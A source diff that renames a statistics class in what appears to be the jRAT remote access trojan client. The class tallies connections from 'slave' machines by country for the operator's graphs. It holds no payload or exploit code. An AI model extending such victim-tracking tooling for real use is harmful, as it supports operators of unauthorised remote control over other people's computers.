@@ -1,9 +1,4 @@
-package io.jrat.client.settings;
-
-import io.jrat.client.AbstractSlave;
-import io.jrat.client.Globals;
-import io.jrat.client.ui.frames.Frame;
-import io.jrat.common.Logger;
+package se.jrat.client.settings;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -14,17 +9,22 @@ import java.io.Serializable;
 import java.util.ArrayList;
 import java.util.List;
 
+import se.jrat.client.AbstractSlave;
+import se.jrat.client.Globals;
+import se.jrat.client.ui.frames.Frame;
+import se.jrat.common.Logger;
+
 import com.redpois0n.graphs.country.Country;
 
-public class Statistics extends AbstractSettings implements Serializable {
+public class CountryStatistics extends AbstractSettings implements Serializable {
 
 	private static final long serialVersionUID = -7692558803046215384L;
 
-	private static final Statistics instance = new Statistics();
+	private static final CountryStatistics instance = new CountryStatistics();
 
-	private transient List<StatEntry> list = new ArrayList<StatEntry>();
+	private transient List<CountryStatEntry> list = new ArrayList<CountryStatEntry>();
 
-	public static Statistics getGlobal() {
+	public static CountryStatistics getGlobal() {
 		return instance;
 	}
 
@@ -32,23 +32,23 @@ public class Statistics extends AbstractSettings implements Serializable {
 		return Settings.getGlobal().getBoolean("stats");
 	}
 
-	public List<StatEntry> getList() {
+	public List<CountryStatEntry> getList() {
 		return list;
 	}
 
-	public StatEntry getEntry(String country, String longcountry) {
+	public CountryStatEntry getEntry(String country, String longcountry) {
 		if (country.equals("?")) {
 			country = "unknown";
 		}
 
 		for (int i = 0; i < list.size(); i++) {
-			StatEntry entry = list.get(i);
+			CountryStatEntry entry = list.get(i);
 			if (entry.country.equalsIgnoreCase(country)) {
 				return entry;
 			}
 		}
 
-		StatEntry stat = new StatEntry();
+		CountryStatEntry stat = new CountryStatEntry();
 		stat.country = country;
 		stat.longcountry = longcountry;
 
@@ -65,7 +65,7 @@ public class Statistics extends AbstractSettings implements Serializable {
 		}
 
 		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
-		list = (ArrayList<StatEntry>) str.readObject();
+		list = (ArrayList<CountryStatEntry>) str.readObject();
 		str.close();
 		reload();
 	}
@@ -85,7 +85,7 @@ public class Statistics extends AbstractSettings implements Serializable {
 			return;
 		}
 
-		StatEntry entry = getEntry(abstractSlave.getCountry(), abstractSlave.getCountry());
+		CountryStatEntry entry = getEntry(abstractSlave.getCountry(), abstractSlave.getCountry());
 
 		entry.connects++;
 		boolean exists = false;
@@ -105,7 +105,7 @@ public class Statistics extends AbstractSettings implements Serializable {
 		Frame.panelStats.uniqueGraph.clear();
 
 		for (int i = 0; i < list.size(); i++) {
-			StatEntry entry = list.get(i);
+			CountryStatEntry entry = list.get(i);
 			try {
 
 				Country total = new Country(entry.getCountry(), entry.getConnects());
@@ -123,7 +123,7 @@ public class Statistics extends AbstractSettings implements Serializable {
 
 	public int getNoConnects() {
 		int no = 0;
-		for (StatEntry e : list) {
+		for (CountryStatEntry e : list) {
 			no += e.connects;
 		}
 		return no;
@@ -131,13 +131,13 @@ public class Statistics extends AbstractSettings implements Serializable {
 
 	public int getDifferentConnects() {
 		int no = 0;
-		for (StatEntry e : list) {
+		for (CountryStatEntry e : list) {
 			no += e.list.size();
 		}
 		return no;
 	}
 
-	public class StatEntry implements Serializable {
+	public class CountryStatEntry implements Serializable {
 
 		private static final long serialVersionUID = 8462429809223243541L;
 
@@ -182,7 +182,7 @@ public class Statistics extends AbstractSettings implements Serializable {
 
 	@Override
 	public File getFile() {
-		return new File(Globals.getSettingsDirectory(), ".stats");
+		return new File(Globals.getSettingsDirectory(), ".countrystats");
 	}
 
 }
